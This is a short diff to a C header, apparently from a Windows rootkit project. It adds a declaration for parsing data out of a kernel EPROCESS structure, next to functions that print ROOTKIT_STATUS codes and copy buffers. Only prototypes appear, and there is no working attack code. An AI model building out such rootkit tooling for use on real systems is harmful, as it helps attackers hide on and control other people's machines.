@@ -9,6 +9,10 @@ PARSING DATA AND BUFFERS USED FOR DIFFERENT STUFF:
 */
 
 
+// Parsing main data from an EPROCESS:
+void ParseEprocess(BYTE ProcessData[EPROCESS_SIZE]);
+
+
 // Parsing ROOTKIT_STATUS return status:
 void PrintStatusCode(ROOTKIT_STATUS status_code);
 void GetBufferValue(PVOID Src, PVOID Dst, SIZE_T Size);
